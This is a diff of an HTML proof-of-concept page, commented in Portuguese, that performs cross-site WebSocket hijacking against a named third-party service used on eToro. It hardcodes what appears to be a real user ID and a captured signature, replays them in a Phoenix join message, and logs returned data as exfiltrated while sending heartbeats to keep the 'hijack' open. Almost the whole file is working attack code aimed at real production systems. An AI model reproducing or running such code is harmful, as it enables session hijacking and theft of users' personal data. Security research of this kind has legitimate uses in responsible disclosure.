@@ -4,75 +4,100 @@
     <meta charset="UTF-8">
     <title>CSWSH Exploit PoC - Userflow/eToro</title>
     <style>
-        body { font-family: monospace; background-color: #1a1a1a; color: #00ff00; padding: 20px; }
-        #console { background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: scroll; }
-        .success { color: #55ff55; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #00ff41; padding: 20px; }
+        #console { background: #000; border: 1px solid #444; padding: 15px; height: 500px; overflow-y: auto; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        .info { color: #888; }
+        .success { color: #55ff55; font-weight: bold; }
         .error { color: #ff5555; }
-        .data { color: #ffff55; border-bottom: 1px solid #333; margin-bottom: 5px; padding-bottom: 5px; }
+        .data { color: #ffff55; background: #222; padding: 5px; margin: 5px 0; border-left: 3px solid #ffff55; }
+        h2 { color: #fff; margin-bottom: 10px; }
     </style>
 </head>
 <body>
-    <h1>Exfiltrando Dados do WebSocket (CSWSH)</h1>
-    <p>Status: <span id="status">Desconectado</span></p>
+    <h2>WebSocket Hijacking PoC (Identity Replay)</h2>
+    <div class="info">Alvo: wss://e.userflow.com</div>
+    <div class="info">Origem do Teste: <span id="origin"></span></div>
+    <hr>
     <div id="console"></div>
 
     <script>
-        const endpoint = "wss://e.userflow.com/end-users/ct_lu2g2jsjmncxfcerlwcpl3yyca/socket/websocket?vsn=2.0.0";
+        // Configurações extraídas do seu tráfego
+        const userId = "47554719";
+        const signature = "7c3a5d9c0a16d1d9d7332ab1dafec3d7823557f5519dcf5efacbf34ea3de390e";
+        const endpoint = `wss://e.userflow.com/end-users/ct_lu2g2jsjmncxfcerlwcpl3yyca/socket/websocket?vsn=2.0.0`;
+        
         const consoleDiv = document.getElementById("console");
-        const statusSpan = document.getElementById("status");
+        document.getElementById("origin").textContent = window.location.origin || "Local File";
 
         function log(msg, type = "") {
             const p = document.createElement("p");
             p.className = type;
-            p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            const time = new Date().toLocaleTimeString();
+            p.textContent = `[${time}] ${msg}`;
             consoleDiv.appendChild(p);
             consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
+        log("Iniciando conexão maliciosa...");
+
         try {
-            log("Iniciando conexão maliciosa para " + endpoint);
             const ws = new WebSocket(endpoint);
 
             ws.onopen = () => {
-                statusSpan.textContent = "Conectado (Handshake Bypass!)";
-                statusSpan.className = "success";
-                log("Conexão WebSocket estabelecida com sucesso.", "success");
+                log("Conexão WebSocket aberta! (Handshake Origin Bypass confirmado)", "success");
 
-                // Payload do Framework Phoenix para dar 'Join' no canal do usuário
-                // O formato é: [join_ref, ref, topic, event, payload]
+                // Payload idêntico ao do framework Phoenix que você capturou
                 const joinPayload = JSON.stringify([
-                    "1", 
-                    "1", 
-                    "end_user:ct_lu2g2jsjmncxfcerlwcpl3yyca", 
+                    "6", 
+                    "6", 
+                    `end_users:${userId}`, 
                     "phx_join", 
-                    {}
+                    {
+                        "protocolVersion": 2,
+                        "userflowClientBuild": "1021223",
+                        "signature": signature,
+                        "clientContext": {
+                            "pageUrl": "https://www.etoro.com/settings/",
+                            "viewportWidth": 1643,
+                            "viewportHeight": 768
+                        }
+                    }
                 ]);
 
-                log("Enviando comando phx_join...");
+                log("Enviando PHX_JOIN com assinatura sequestrada...");
                 ws.send(joinPayload);
             };
 
             ws.onmessage = (event) => {
-                // Aqui é onde os dados sensíveis (e-mail, nome, fluxos) aparecem
-                log("DADOS EXFILTRADOS: " + event.data, "data");
+                const rawData = event.data;
                 
-                // Enviar batida de coração (heartbeat) para manter a conexão viva
-                if (event.data.includes("phx_reply")) {
-                    ws.send(JSON.stringify([null, "2", "phoenix", "heartbeat", {}]));
+                if (rawData.includes("phx_reply") && rawData.includes("ok")) {
+                    log("AUTENTICAÇÃO COM SUCESSO! O canal está aberto para exfiltração.", "success");
+                } else if (rawData.includes("error")) {
+                    log("ERRO NA AUTENTICAÇÃO: " + rawData, "error");
+                } else {
+                    log("DADOS EXFILTRADOS: " + rawData, "data");
+                }
+
+                // Manter a conexão viva (Heartbeat necessário no Phoenix)
+                if (rawData.includes("phx_reply")) {
+                    setTimeout(() => {
+                        ws.send(JSON.stringify([null, "7", "phoenix", "heartbeat", {}]));
+                        log("Enviando heartbeat para manter sequestro ativo...", "info");
+                    }, 30000);
                 }
             };
 
             ws.onerror = (err) => {
-                log("Erro na conexão. Verifique se o ID expirou ou se há proteção de IP.", "error");
+                log("Erro no WebSocket. Verifique se o ID ou a Assinatura expiraram.", "error");
             };
 
             ws.onclose = () => {
-                log("Conexão encerrada pelo servidor.", "error");
-                statusSpan.textContent = "Encerrado";
+                log("Conexão encerrada pelo servidor remoto.", "error");
             };
 
         } catch (e) {
-            log("Erro: " + e.message, "error");
+            log("Falha crítica: " + e.message, "error");
         }
     </script>
 </body>
